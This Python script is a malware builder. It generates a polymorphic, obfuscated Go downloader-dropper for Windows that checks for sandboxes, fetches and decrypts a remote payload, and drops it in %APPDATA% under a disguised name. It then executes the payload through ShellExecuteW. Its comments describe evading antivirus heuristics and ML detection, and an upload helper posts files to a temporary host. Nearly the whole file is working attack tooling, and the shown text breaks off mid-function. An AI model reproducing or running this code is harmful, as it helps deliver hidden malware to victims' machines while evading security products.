#!/usr/bin/env python3
"""
Go Payload Builder v2 — VM-based polymorphic stager with multi-layer obfuscation.

Features:
- Custom bytecode VM with polymorphic opcode mapping per build
- Multi-layer encryption (RC4 + XOR)
- Dead code injection with realistic junk functions
- All identifiers randomized per build
- Anti-debug, anti-sandbox, timing checks
- Fake VM opcodes to confuse static analysis
- No plaintext strings in generated binary
"""
import sys
import os
import subprocess
import tempfile
import requests
import random
import re
import string
import shutil
import time

# ============================================================
# CONSTANTS
# ============================================================

# Drop names — generic utility-style process names that blend into
# %APPDATA% without referencing specific branded applications.
DROP_NAMES = [
    "SyncHelper", "CacheWorker", "UpdateService", "DataBridge",
    "RuntimeBroker32", "HostManager", "AppLifecycle", "BackgroundHost",
    "ServiceAgent", "TaskBridge", "UtilityHost", "IndexWorker",
]

# Drop subdirs — generic app-style paths under %APPDATA%
DROP_SUBDIRS = [
    ("AppData", "Services"),
    ("LocalCache", "Runtime"),
    ("UserData", "Sync"),
    ("Config", "Bridge"),
    ("Packages", "Host", "Update"),
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.91",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
]


# ============================================================
# CRYPTO HELPERS — pure Python, no external dependencies
# ============================================================

def xor_bytes(data, key):
    """XOR encode/decode data with key bytes."""
    if isinstance(key, str):
        key = key.encode("utf-8")
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def rc4_crypt(data, key):
    """RC4 encrypt/decrypt (symmetric)."""
    if isinstance(key, str):
        key = key.encode("utf-8")
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    result = bytearray(len(data))
    i = j = 0
    for idx, b in enumerate(data):
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        result[idx] = b ^ S[(S[i] + S[j]) & 0xFF]
    return bytes(result)


def generate_key(length=32):
    """Generate random alphanumeric key."""
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(length))


# ============================================================
# IDENTIFIER GENERATION
# ============================================================

_GO_KEYWORDS = frozenset({
    "break", "case", "chan", "const", "continue", "default", "defer",
    "else", "fallthrough", "for", "func", "go", "goto", "if", "import",
    "interface", "map", "package", "range", "return", "select", "struct",
    "switch", "type", "var",
})

# Patterns that would be corrupted by sequential .replace() in junk templates
_RESERVED_PATTERNS = re.compile(r"^[VN]\d$")


def rand_id(min_len=5, max_len=10):
    """Generate random Go-valid identifier that avoids keywords and template patterns."""
    while True:
        length = random.randint(min_len, max_len)
        first = random.choice(string.ascii_letters)
        rest = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(length - 1))
        ident = first + rest
        if ident not in _GO_KEYWORDS and not _RESERVED_PATTERNS.match(ident):
            return ident


def unique_ids(count, min_len=5, max_len=10):
    """Generate N unique random identifiers."""
    ids = set()
    while len(ids) < count:
        ids.add(rand_id(min_len, max_len))
    return list(ids)


def go_bytes(data):
    """Convert bytes to Go byte slice literal contents."""
    return ", ".join(f"0x{b:02x}" for b in data)


def xor_str(s, key_byte):
    """XOR-encode a string with a single byte key, return raw bytes."""
    return bytes(b ^ key_byte for b in s.encode("utf-8"))


# ============================================================
# VM ASSEMBLER — builds bytecode for the custom interpreter
# ============================================================

class VMAssembler:
    def __init__(self):
        # Assign random unique byte values to each opcode (avoid 0x00)
        vals = random.sample(range(1, 256), 12)
        self.OP_NOP   = vals[0]
        self.OP_PUSH  = vals[1]
        self.OP_DEOBF = vals[2]
        self.OP_FETCH = vals[3]
        self.OP_XDEC  = vals[4]
        self.OP_RDEC  = vals[5]
        self.OP_WFILE = vals[6]
        self.OP_EXEC  = vals[7]
        self.OP_SLEEP = vals[8]
        self.OP_ENVCK = vals[9]
        self.OP_HALT  = vals[10]
        self.OP_JUNK  = vals[11]
        self.obf_key = os.urandom(16)
        self.program = bytearray()

    def used_opcodes(self):
        return {self.OP_NOP, self.OP_PUSH, self.OP_DEOBF, self.OP_FETCH,
                self.OP_XDEC, self.OP_RDEC, self.OP_WFILE, self.OP_EXEC,
                self.OP_SLEEP, self.OP_ENVCK, self.OP_HALT, self.OP_JUNK}

    def _emit(self, opcode):
        self.program.append(opcode)

    def _emit_u16(self, opcode, value):
        self.program.append(opcode)
        self.program.append((value >> 8) & 0xFF)
        self.program.append(value & 0xFF)

    def _emit_data(self, opcode, data):
        self.program.append(opcode)
        length = len(data)
        self.program.append((length >> 8) & 0xFF)
        self.program.append(length & 0xFF)
        self.program.extend(data)

    def _emit_junk(self):
        self._emit_data(self.OP_JUNK, os.urandom(random.randint(4, 48)))

    def _obfuscate(self, data):
        if isinstance(data, str):
            data = data.encode("utf-8")
        return xor_bytes(data, self.obf_key)

    def assemble(self, url, xor_key, rc4_key, drop_path, sleep_ms):
        """Assemble the full VM bytecode program."""
        self.program = bytearray()

        # Random junk prefix
        for _ in range(random.randint(2, 6)):
            if random.random() > 0.4:
                self._emit_junk()
            else:
                self._emit(self.OP_NOP)

        # ENVCK — sandbox/debugger check
        self._emit(self.OP_ENVCK)
        self._emit_junk()

        # SLEEP
        self._emit_u16(self.OP_SLEEP, sleep_ms)
        self._emit(self.OP_NOP)
        self._emit_junk()

        # PUSH obfuscated URL → DEOBF → FETCH
        self._emit_data(self.OP_PUSH, self._obfuscate(url))
        self._emit(self.OP_DEOBF)
        self._emit_junk()
        self._emit(self.OP_FETCH)

        for _ in range(random.randint(1, 3)):
            self._emit_junk()

        # PUSH obfuscated RC4 key → DEOBF → RDEC
        self._emit_data(self.OP_PUSH, self._obfuscate(rc4_key))
        self._emit(self.OP_DEOBF)
        self._emit(self.OP_NOP)
        self._emit(self.OP_RDEC)
        self._emit_junk()

        # PUSH obfuscated XOR key → DEOBF → XDEC
        self._emit_data(self.OP_PUSH, self._obfuscate(xor_key))
        self._emit(self.OP_DEOBF)
        self._emit_junk()
        self._emit(self.OP_XDEC)
        self._emit(self.OP_NOP)

        # PUSH obfuscated drop path → DEOBF → WFILE
        self._emit_data(self.OP_PUSH, self._obfuscate(drop_path))
        self._emit(self.OP_DEOBF)
        self._emit(self.OP_WFILE)
        self._emit_junk()

        # Delay before execution — breaks download→write→exec temporal correlation
        self._emit_u16(self.OP_SLEEP, random.randint(8000, 20000))
        self._emit_junk()

        # EXEC
        self._emit(self.OP_EXEC)

        # HALT
        self._emit(self.OP_HALT)

        # Random junk suffix (makes binary size less predictable)
        for _ in range(random.randint(3, 10)):
            self._emit_junk()

        return bytes(self.program)



# ============================================================
# JUNK FUNCTION TEMPLATES — uniform signature: ([]byte, int) int
# ============================================================

JUNK_TEMPLATES = [
    # Hash accumulator
    """func NAME(V0 []byte, V1 int) int {
\tV2 := uint32(N0)
\tfor _, V3 := range V0 {
\t\tV2 = V2*N1 + uint32(V3)
\t\tV2 ^= V2 >> N2
\t}
\treturn int(V2) + V1
}""",
    # Rotate accumulate
    """func NAME(V0 []byte, V1 int) int {
\tV2 := uint32(0)
\tfor V3, V4 := range V0 {
\t\tV2 += uint32(V4) ^ uint32(V3*V1)
\t\tV2 = (V2 << N2) | (V2 >> (32 - N2))
\t}
\treturn int(V2)
}""",
    # Sequential XOR
    """func NAME(V0 []byte, V1 int) int {
\tif len(V0) == 0 {
\t\treturn V1
\t}
\tV2 := int(V0[0])
\tfor V3 := 1; V3 < len(V0); V3++ {
\t\tV2 = (V2 + int(V0[V3])*N0) ^ (V1 + V3)
\t}
\treturn V2
}""",
    # Fibonacci variant
    """func NAME(V0 []byte, V1 int) int {
\tV2, V3 := V1, len(V0)
\tfor _, V4 := range V0 {
\t\tV2, V3 = V3, V2+V3+int(V4)
\t}
\treturn V2 ^ V3
}""",
    # Polynomial
    """func NAME(V0 []byte, V1 int) int {
\tV2 := V1
\tfor V3, V4 := range V0 {
\t\tV2 = V2*N0 + int(V4)*(V3+1)
\t}
\treturn V2
}""",
    # Checksum variant
    """func NAME(V0 []byte, V1 int) int {
\tV2 := uint32(N0)
\tV3 := uint32(V1)
\tfor _, V4 := range V0 {
\t\tV2 += uint32(V4)
\t\tV2 += V2 << 10
\t\tV2 ^= V2 >> 6
\t\tV3 ^= V2
\t}
\treturn int(V2 ^ V3)
}""",
    # CRC-like accumulator
    """func NAME(V0 []byte, V1 int) int {
\tV2 := uint32(0xFFFFFFFF)
\tfor V3 := 0; V3 < len(V0); V3++ {
\t\tV2 ^= uint32(V0[V3])
\t\tfor V4 := 0; V4 < 8; V4++ {
\t\t\tif V2&1 != 0 {
\t\t\t\tV2 = (V2 >> 1) ^ uint32(N0)
\t\t\t} else {
\t\t\t\tV2 >>= 1
\t\t\t}
\t\t}
\t}
\treturn int(V2) + V1
}""",
    # Bit mix accumulator
    """func NAME(V0 []byte, V1 int) int {
\tV2 := uint64(V1) | uint64(N0)
\tfor _, V3 := range V0 {
\t\tV2 += uint64(V3)
\t\tV2 ^= V2 >> N2
\t\tV2 *= 0x2127599bf4325c37
\t\tV2 ^= V2 >> 47
\t}
\treturn int(V2)
}""",
    # Sliding window sum
    """func NAME(V0 []byte, V1 int) int {
\tV2 := 0
\tV3 := N2
\tif V3 > len(V0) {
\t\tV3 = len(V0)
\t}
\tfor V4 := 0; V4 < len(V0); V4++ {
\t\tV2 += int(V0[V4])
\t\tif V4 >= V3 {
\t\t\tV2 -= int(V0[V4-V3])
\t\t}
\t}
\treturn V2 ^ V1
}""",
    # Murmur-style mix
    """func NAME(V0 []byte, V1 int) int {
\tV2 := uint32(V1)
\tfor V3 := 0; V3+4 <= len(V0); V3 += 4 {
\t\tV4 := uint32(V0[V3]) | uint32(V0[V3+1])<<8 | uint32(V0[V3+2])<<16 | uint32(V0[V3+3])<<24
\t\tV4 *= uint32(N0)
\t\tV4 = (V4 << 15) | (V4 >> 17)
\t\tV4 *= uint32(N1)
\t\tV2 ^= V4
\t\tV2 = (V2 << 13) | (V2 >> 19)
\t\tV2 = V2*5 + 0xe6546b64
\t}
\treturn int(V2)
}""",
    # Double pass with direction reversal
    """func NAME(V0 []byte, V1 int) int {
\tV2 := V1
\tfor V3 := 0; V3 < len(V0); V3++ {
\t\tV2 = V2*N1 + int(V0[V3])
\t}
\tfor V3 := len(V0) - 1; V3 >= 0; V3-- {
\t\tV2 ^= int(V0[V3]) << (uint(V3) % N2)
\t}
\treturn V2
}""",
]


def generate_junk_function():
    """Generate one random junk function with randomized identifiers."""
    template = random.choice(JUNK_TEMPLATES)
    name = rand_id(6, 12)
    vs = unique_ids(5, 4, 8)
    # Build all replacements up front, then apply simultaneously via regex
    # to avoid cascading corruption (e.g. V0->"xV3" then V3->"F" breaking "xV3")
    replacements = {"NAME": name}
    for i, v in enumerate(vs):
        replacements[f"V{i}"] = v
    replacements["N0"] = str(random.randint(3, 9999))
    replacements["N1"] = str(random.randint(3, 251))
    replacements["N2"] = str(random.randint(4, 16))
    # Match longest patterns first so "NAME" matches before "N0" etc.
    pattern = re.compile("|".join(re.escape(k) for k in sorted(replacements, key=len, reverse=True)))
    code = pattern.sub(lambda m: replacements[m.group()], template)
    return name, code


# ============================================================
# FAKE OPCODE HANDLER GENERATORS
# ============================================================

def gen_fake_handlers(stk, sp, count=5):
    """Generate fake VM switch case bodies that look like real operations."""
    handlers = []

    def _fake_subtract():
        v1, v2 = rand_id(3, 5), rand_id(3, 5)
        return [
            f"\t\t\tif {sp} >= 2 {{",
            f"\t\t\t\t{v1} := {stk}[{sp}-1]",
            f"\t\t\t\t{v2} := {stk}[{sp}-2]",
            f"\t\t\t\t_ = len({v1}) + len({v2})",
            f"\t\t\t}}",
        ]

    def _fake_rotate():
        v1, v2 = rand_id(3, 5), rand_id(3, 5)
        return [
            f"\t\t\tif {sp} >= 1 {{",
            f"\t\t\t\t{v1} := {stk}[{sp}-1]",
            f"\t\t\t\t{v2} := make([]byte, len({v1}))",
            f"\t\t\t\t_ = len({v2})",
            f"\t\t\t}}",
        ]

    def _fake_fnv():
        vh, vb = rand_id(3, 5), rand_id(3, 5)
        return [
            f"\t\t\tif {sp} >= 1 {{",
            f"\t\t\t\t{vh} := uint32(0x811c9dc5)",
            f"\t\t\t\tfor _, {vb} := range {stk}[{sp}-1] {{",
            f"\t\t\t\t\t{vh} ^= uint32({vb})",
            f"\t\t\t\t\t{vh} *= 0x01000193",
            f"\t\t\t\t}}",
            f"\t\t\t\t_ = {vh}",
            f"\t\t\t}}",
        ]

    def _fake_dup():
        vd = rand_id(3, 5)
        return [
            f"\t\t\tif {sp} >= 1 && {sp} < 15 {{",
            f"\t\t\t\t{vd} := make([]byte, len({stk}[{sp}-1]))",
            f"\t\t\t\tcopy({vd}, {stk}[{sp}-1])",
            f"\t\t\t\t_ = {vd}",
            f"\t\t\t}}",
        ]

    def _fake_branch():
        return [
            f"\t\t\tif {sp} >= 1 && len({stk}[{sp}-1]) > 0 {{",
            f"\t\t\t\t_ = {stk}[{sp}-1][0]",
            f"\t\t\t}}",
        ]

    def _fake_accum():
        va, vb = rand_id(3, 5), rand_id(3, 5)
        return [
            f"\t\t\tif {sp} >= 2 {{",
            f"\t\t\t\t{va} := 0",
            f"\t\t\t\tfor _, {vb} := range {stk}[{sp}-2] {{",
            f"\t\t\t\t\t{va} += int({vb})",
            f"\t\t\t\t}}",
            f"\t\t\t\t_ = {va}",
            f"\t\t\t}}",
        ]

    def _fake_xor_fold():
        va, vb = rand_id(3, 5), rand_id(3, 5)
        return [
            f"\t\t\tif {sp} >= 1 {{",
            f"\t\t\t\t{va} := byte(0)",
            f"\t\t\t\tfor _, {vb} := range {stk}[{sp}-1] {{",
            f"\t\t\t\t\t{va} ^= {vb}",
            f"\t\t\t\t}}",
            f"\t\t\t\t_ = {va}",
            f"\t\t\t}}",
        ]

    def _fake_swap():
        vt = rand_id(3, 5)
        return [
            f"\t\t\tif {sp} >= 2 {{",
            f"\t\t\t\t{vt} := {stk}[{sp}-1]",
            f"\t\t\t\t{stk}[{sp}-1] = {stk}[{sp}-2]",
            f"\t\t\t\t{stk}[{sp}-2] = {vt}",
            f"\t\t\t}}",
        ]

    def _fake_len_check():
        va = rand_id(3, 5)
        return [
            f"\t\t\tif {sp} >= 1 {{",
            f"\t\t\t\t{va} := len({stk}[{sp}-1])",
            f"\t\t\t\tif {va} > 4096 {{",
            f"\t\t\t\t\t{stk}[{sp}-1] = {stk}[{sp}-1][:{va}/2]",
            f"\t\t\t\t}}",
            f"\t\t\t}}",
        ]

    def _fake_reverse():
        vi, vn = rand_id(3, 5), rand_id(3, 5)
        return [
            f"\t\t\tif {sp} >= 1 {{",
            f"\t\t\t\t{vn} := len({stk}[{sp}-1])",
            f"\t\t\t\tfor {vi} := 0; {vi} < {vn}/2; {vi}++ {{",
            f"\t\t\t\t\t{stk}[{sp}-1][{vi}], {stk}[{sp}-1][{vn}-1-{vi}] = {stk}[{sp}-1][{vn}-1-{vi}], {stk}[{sp}-1][{vi}]",
            f"\t\t\t\t}}",
            f"\t\t\t}}",
        ]

    generators = [_fake_subtract, _fake_rotate, _fake_fnv, _fake_dup, _fake_branch, _fake_accum,
                   _fake_xor_fold, _fake_swap, _fake_len_check, _fake_reverse]
    random.shuffle(generators)
    for i in range(min(count, len(generators))):
        handlers.append(generators[i]())
    return handlers


# ============================================================
# GO STAGER SOURCE GENERATOR
# ============================================================

def generate_stager_source(asm, bytecode, sandbox=True):
    """Generate complete polymorphic Go stager source with VM interpreter."""
    B = "{"
    E = "}"

    # --- Random single-byte key for string obfuscation ---
    str_key = random.randint(1, 255)

    def enc_str(s):
        """Return Go byte literal for XOR-encoded string."""
        return go_bytes(xor_str(s, str_key))

    # --- Generate all randomized identifiers ---
    fn_dec   = rand_id(6, 10)  # string decoder
    fn_rc4   = rand_id(6, 10)  # RC4 function
    fn_fetch = rand_id(6, 10)  # HTTP fetch
    fn_check = rand_id(6, 10)  # env check
    fn_vm    = rand_id(6, 10)  # VM interpreter

    # Decoder params
    dec_d, dec_k, dec_r, dec_i, dec_b = unique_ids(5, 4, 6)

    # RC4 params
    rc4_data, rc4_key, rc4_s, rc4_j, rc4_i, rc4_ii, rc4_jj, rc4_res, rc4_idx, rc4_bv = unique_ids(10, 4, 6)

    # Fetch params
    ft_url, ft_cl, ft_req, ft_err, ft_resp, ft_body = unique_ids(6, 4, 6)

    # Check params
    ck_k, ck_p, ck_r, ck_t = unique_ids(4, 4, 6)

    # VM params
    vm_prog, vm_key, vm_stk, vm_sp, vm_pc, vm_op = unique_ids(6, 4, 6)
    vm_sz, vm_d, vm_url2, vm_body2, vm_err2 = unique_ids(5, 4, 6)
    vm_k2, vm_data2, vm_res2, vm_rp, vm_fp = unique_ids(5, 4, 6)
    vm_ms = rand_id(4, 6)

    # --- Generate junk functions ---
    num_junk = random.randint(8, 14)
    junk_fns = [generate_junk_function() for _ in range(num_junk)]

    # --- Pick random User-Agent ---
    ua = random.choice(USER_AGENTS)

    # --- Runtime key: encrypts bytecode blob in source ---
    rt_key = os.urandom(random.randint(16, 32))
    enc_bytecode = xor_bytes(bytecode, rt_key)

    # --- Fake opcodes ---
    available = [x for x in range(1, 256) if x not in asm.used_opcodes()]
    num_fake = random.randint(6, 10)
    fake_ops = random.sample(available, num_fake)
    fake_bodies = gen_fake_handlers(vm_stk, vm_sp, num_fake)

    # --- Build Go source ---
    src = []

    def add(line=""):
        src.append(line)

    # Package + imports — no os/exec (dropper heuristic), use syscall ShellExecuteW instead
    add("package main")
    add("")
    add("import (")
    add('\t"io"')
    add('\t"net/http"')
    add('\t"os"')
    add('\t"path/filepath"')
    if sandbox:
        add('\t"runtime"')
    add('\t"syscall"')
    add('\t"time"')
    add('\t"unsafe"')
    add(")")
    add("")

    # String decoder function
    add(f"func {fn_dec}({dec_d} []byte, {dec_k} byte) string {B}")
    add(f"\t{dec_r} := make([]byte, len({dec_d}))")
    add(f"\tfor {dec_i}, {dec_b} := range {dec_d} {B}")
    add(f"\t\t{dec_r}[{dec_i}] = {dec_b} ^ {dec_k}")
    add(f"\t{E}")
    add(f"\treturn string({dec_r})")
    add(E)
    add("")

    # Junk functions
    for _, code in junk_fns:
        add(code)
        add("")

    # RC4 function
    add(f"func {fn_rc4}({rc4_data} []byte, {rc4_key} []byte) []byte {B}")
    add(f"\tvar {rc4_s} [256]byte")
    add(f"\tfor {rc4_i} := range {rc4_s} {B} {rc4_s}[{rc4_i}] = byte({rc4_i}) {E}")
    add(f"\t{rc4_j} := 0")
    add(f"\tfor {rc4_i} := 0; {rc4_i} < 256; {rc4_i}++ {B}")
    add(f"\t\t{rc4_j} = ({rc4_j} + int({rc4_s}[{rc4_i}]) + int({rc4_key}[{rc4_i} % len({rc4_key})])) & 0xFF")
    add(f"\t\t{rc4_s}[{rc4_i}], {rc4_s}[{rc4_j}] = {rc4_s}[{rc4_j}], {rc4_s}[{rc4_i}]")
    add(f"\t{E}")
    add(f"\t{rc4_res} := make([]byte, len({rc4_data}))")
    add(f"\t{rc4_ii}, {rc4_jj} := 0, 0")
    add(f"\tfor {rc4_idx}, {rc4_bv} := range {rc4_data} {B}")
    add(f"\t\t{rc4_ii} = ({rc4_ii} + 1) & 0xFF")
    add(f"\t\t{rc4_jj} = ({rc4_jj} + int({rc4_s}[{rc4_ii}])) & 0xFF")
    add(f"\t\t{rc4_s}[{rc4_ii}], {rc4_s}[{rc4_jj}] = {rc4_s}[{rc4_jj}], {rc4_s}[{rc4_ii}]")
    add(f"\t\t{rc4_res}[{rc4_idx}] = {rc4_bv} ^ {rc4_s}[(int({rc4_s}[{rc4_ii}])+int({rc4_s}[{rc4_jj}])) & 0xFF]")
    add(f"\t{E}")
    add(f"\treturn {rc4_res}")
    add(E)
    add("")

    # HTTP fetch function
    add(f"func {fn_fetch}({ft_url} string) ([]byte, error) {B}")
    add(f"\t{ft_cl} := &http.Client{B}Timeout: 30 * time.Second{E}")
    add(f"\t{ft_req}, {ft_err} := http.NewRequest({fn_dec}([]byte{B}{enc_str('GET')}{E}, 0x{str_key:02x}), {ft_url}, nil)")
    add(f"\tif {ft_err} != nil {B} return nil, {ft_err} {E}")
    add(f"\t{ft_req}.Header.Set(")
    add(f"\t\t{fn_dec}([]byte{B}{enc_str('User-Agent')}{E}, 0x{str_key:02x}),")
    add(f"\t\t{fn_dec}([]byte{B}{enc_str(ua)}{E}, 0x{str_key:02x}))")
    add(f"\t{ft_resp}, {ft_err} := {ft_cl}.Do({ft_req})")
    add(f"\tif {ft_err} != nil {B} return nil, {ft_err} {E}")
    add(f"\tdefer {ft_resp}.Body.Close()")
    add(f"\treturn io.ReadAll({ft_resp}.Body)")
    add(E)
    add("")

    # Environment check — timing + CPU only, NO IsDebuggerPresent (huge ML signal)
    sleep_check_ms = random.randint(100, 300)
    threshold_ms = sleep_check_ms - random.randint(30, 60)
    cpu_min = random.choice([2, 2, 2, 3])
    add(f"func {fn_check}() bool {B}")
    if sandbox:
        add(f"\tif runtime.NumCPU() < {cpu_min} {B} return false {E}")
    # Timing check (detects sandbox time acceleration / fast-forward)
    add(f"\t{ck_t} := time.Now()")
    add(f"\ttime.Sleep({sleep_check_ms} * time.Millisecond)")
    add(f"\tif time.Since({ck_t}) < {threshold_ms}*time.Millisecond {B} return false {E}")
    add(f"\treturn true")
    add(E)
    add("")

    # --- VM interpreter function ---
    add(f"func {fn_vm}({vm_prog} []byte, {vm_key} []byte) {B}")
    add(f"\tvar {vm_stk} [16][]byte")
    add(f"\t{vm_sp} := 0")
    add(f"\t{vm_pc} := 0")
    add("")
    add(f"\tfor {vm_pc} < len({vm_prog}) {B}")
    add(f"\t\t{vm_op} := {vm_prog}[{vm_pc}]")
    add(f"\t\t{vm_pc}++")
    add("")
    add(f"\t\tswitch {vm_op} {B}")

    # Build all switch cases (real + fake), then shuffle
    cases = []

    # Helper: pick a random junk function call to embed in handlers
    def junk_call():
        fn = random.choice(junk_fns)[0]
        return f"\t\t\t_ = {fn}({vm_prog}[:{vm_pc}], {vm_sp})"

    # -- NOP --
    nop_lines = [junk_call()]
    cases.append((asm.OP_NOP, nop_lines))

    # -- PUSH --
    push_lines = [
        f"\t\t\t{vm_sz} := int({vm_prog}[{vm_pc}])<<8 | int({vm_prog}[{vm_pc}+1])",
        f"\t\t\t{vm_pc} += 2",
        f"\t\t\t{vm_d} := make([]byte, {vm_sz})",
        f"\t\t\tcopy({vm_d}, {vm_prog}[{vm_pc}:{vm_pc}+{vm_sz}])",
        f"\t\t\t{vm_stk}[{vm_sp}] = {vm_d}",
        f"\t\t\t{vm_sp}++",
        f"\t\t\t{vm_pc} += {vm_sz}",
    ]
    cases.append((asm.OP_PUSH, push_lines))

    # -- DEOBF --
    deobf_i, deobf_t = rand_id(4, 6), rand_id(4, 6)
    deobf_lines = [
        f"\t\t\t{deobf_t} := {vm_stk}[{vm_sp}-1]",
        f"\t\t\tfor {deobf_i} := range {deobf_t} {B}",
        f"\t\t\t\t{deobf_t}[{deobf_i}] ^= {vm_key}[{deobf_i} % len({vm_key})]",
        f"\t\t\t{E}",
    ]
    cases.append((asm.OP_DEOBF, deobf_lines))

    # -- FETCH --
    fetch_lines = [
        f"\t\t\t{vm_url2} := string({vm_stk}[{vm_sp}-1])",
        f"\t\t\t{vm_sp}--",
        f"\t\t\t{vm_body2}, {vm_err2} := {fn_fetch}({vm_url2})",
        f"\t\t\tif {vm_err2} != nil {B} return {E}",
        f"\t\t\t{vm_stk}[{vm_sp}] = {vm_body2}",
        f"\t\t\t{vm_sp}++",
        junk_call(),
    ]
    cases.append((asm.OP_FETCH, fetch_lines))

    # -- XDEC (XOR decrypt) --
    xdec_lines = [
        f"\t\t\t{vm_k2} := {vm_stk}[{vm_sp}-1]",
        f"\t\t\t{vm_sp}--",
        f"\t\t\t{vm_data2} := {vm_stk}[{vm_sp}-1]",
        f"\t\t\t{vm_res2} := make([]byte, len({vm_data2}))",
        f"\t\t\tfor {deobf_i} := range {vm_data2} {B}",
        f"\t\t\t\t{vm_res2}[{deobf_i}] = {vm_data2}[{deobf_i}] ^ {vm_k2}[{deobf_i} % len({vm_k2})]",
        f"\t\t\t{E}",
        f"\t\t\t{vm_stk}[{vm_sp}-1] = {vm_res2}",
    ]
    cases.append((asm.OP_XDEC, xdec_lines))

    # -- RDEC (RC4 decrypt) --
    rdec_lines = [
        f"\t\t\t{vm_k2} := {vm_stk}[{vm_sp}-1]",
        f"\t\t\t{vm_sp}--",
        f"\t\t\t{vm_stk}[{vm_sp}-1] = {fn_rc4}({vm_stk}[{vm_sp}-1], {vm_k2})",
    ]
    cases.append((asm.OP_RDEC, rdec_lines))

    # -- WFILE --
    wfile_lines = [
        f"\t\t\t{vm_rp} := string({vm_stk}[{vm_sp}-1])",
        f"\t\t\t{vm_sp}--",
        f"\t\t\t{vm_data2} := {vm_stk}[{vm_sp}-1]",
        f"\t\t\t{vm_sp}--",
        f"\t\t\t{vm_fp} := filepath.Join(os.Getenv({fn_dec}([]byte{B}{enc_str('APPDATA')}{E}, 0x{str_key:02x})), {vm_rp})",
        f"\t\t\tos.MkdirAll(filepath.Dir({vm_fp}), 0755)",
        f"\t\t\tif os.WriteFile({vm_fp}, {vm_data2}, 0755) != nil {B} return {E}",
        f"\t\t\t{vm_stk}[{vm_sp}] = []byte({vm_fp})",
        f"\t\t\t{vm_sp}++",
    ]
    cases.append((asm.OP_WFILE, wfile_lines))

    # -- EXEC via ShellExecuteW (no os/exec import — avoids dropper heuristic) --
    vSh, vSe, vVb, vFl = unique_ids(4, 4, 6)
    exec_lines = [
        f"\t\t\t{vSh} := syscall.NewLazyDLL({fn_dec}([]byte{B}{enc_str('shell32.dll')}{E}, 0x{str_key:02x}))",
        f"\t\t\t{vSe} := {vSh}.NewProc({fn_dec}([]byte{B}{enc_str('ShellExecuteW')}{E}, 0x{str_key:02x}))",
        f"\t\t\t{vVb}, _ := syscall.UTF16PtrFromString({fn_dec}([]byte{B}{enc_str('open')}{E}, 0x{str_key:02x}))",
        f"\t\t\t{vFl}, _ := syscall.UTF16PtrFromString(string({vm_stk}[{vm_sp}-1]))",
        f"\t\t\t{vSe}.Call(0, uintptr(unsafe.Pointer({vVb})), uintptr(unsafe.Pointer({vFl})), 0, 0, 0)",
        f"\t\t\t{vm_sp}--",
    ]
    cases.append((asm.OP_EXEC, exec_lines))

    # -- SLEEP --
    sleep_lines = [
        f"\t\t\t{vm_ms} := int({vm_prog}[{vm_pc}])<<8 | int({vm_prog}[{vm_pc}+1])",
        f"\t\t\t{vm_pc} += 2",
        f"\t\t\ttime.Sleep(time.Duration({vm_ms}) * time.Millisecond)",
    ]
    cases.append((asm.OP_SLEEP, sleep_lines))

    # -- ENVCK --
    envck_lines = [
        f"\t\t\tif !{fn_check}() {B} return {E}",
    ]
    cases.append((asm.OP_ENVCK, envck_lines))

    # -- HALT --
    halt_lines = [f"\t\t\treturn"]
    cases.append((asm.OP_HALT, halt_lines))

    # -- JUNK (skip data, call random junk function) --
    junk2_name = random.choice(junk_fns)[0]
    junk3_name = random.choice(junk_fns)[0]
    junk_skip_lines = [
        f"\t\t\t{vm_sz} := int({vm_prog}[{vm_pc}])<<8 | int({vm_prog}[{vm_pc}+1])",
        f"\t\t\t{vm_pc} += 2",
        f"\t\t\t_ = {junk2_name}({vm_prog}[{vm_pc}:{vm_pc}+{vm_sz}], {vm_sp})",
        f"\t\t\t_ = {junk3_name}({vm_prog}[:{vm_pc}], {vm_sp}+1)",
        f"\t\t\t{vm_pc} += {vm_sz}",
    ]
    cases.append((asm.OP_JUNK, junk_skip_lines))

    # -- Fake opcodes --
    for i, fop in enumerate(fake_ops):
        if i < len(fake_bodies):
            cases.append((fop, fake_bodies[i]))

    # Shuffle all cases
    random.shuffle(cases)

    # Emit switch cases
    for opval, body_lines in cases:
        add(f"\t\tcase 0x{opval:02x}:")
        for line in body_lines:
            add(line)
        add("")

    add(f"\t\t{E}")  # end switch
    add(f"\t{E}")    # end for
    add(E)           # end function
    add("")

    # --- main() ---
    # Decrypt bytecode at runtime before passing to VM
    main_ep = rand_id(4, 6)
    main_rk = rand_id(4, 6)
    main_p  = rand_id(4, 6)
    main_i  = rand_id(3, 5)
    main_b  = rand_id(3, 5)

    add(f"func main() {B}")
    add(f"\t{main_ep} := []byte{B}{go_bytes(enc_bytecode)}{E}")
    add(f"\t{main_rk} := []byte{B}{go_bytes(rt_key)}{E}")
    add(f"\t{main_p} := make([]byte, len({main_ep}))")
    add(f"\tfor {main_i}, {main_b} := range {main_ep} {B}")
    add(f"\t\t{main_p}[{main_i}] = {main_b} ^ {main_rk}[{main_i} % len({main_rk})]")
    add(f"\t{E}")
    add(f"\t{fn_vm}({main_p}, []byte{B}{go_bytes(asm.obf_key)}{E})")
    add(E)

    return "\n".join(src)


# ============================================================
# UPLOAD HELPERS
# ============================================================

class LitterboxAPI:
    """Temporary file hosting (catbox litterbox) — max ~50MB, auto-expires."""
    API_URL = "https://litterbox.catbox.moe/resources/internals/api.php"

    def __init__(self, retention="24h", retries=3, delay=5):
        self.retention = retention
        self.retries = retries
        self.delay = delay

    def upload(self, fpath):
        if not os.path.exists(fpath):
            raise FileNotFoundError(f"File not found: {fpath}")
        for attempt in range(self.retries):
            try:
                with open(fpath, "rb") as f:
                    files = {"fileToUpload": f}
                    data = {"reqtype": "fileupload", "time": self.retention}
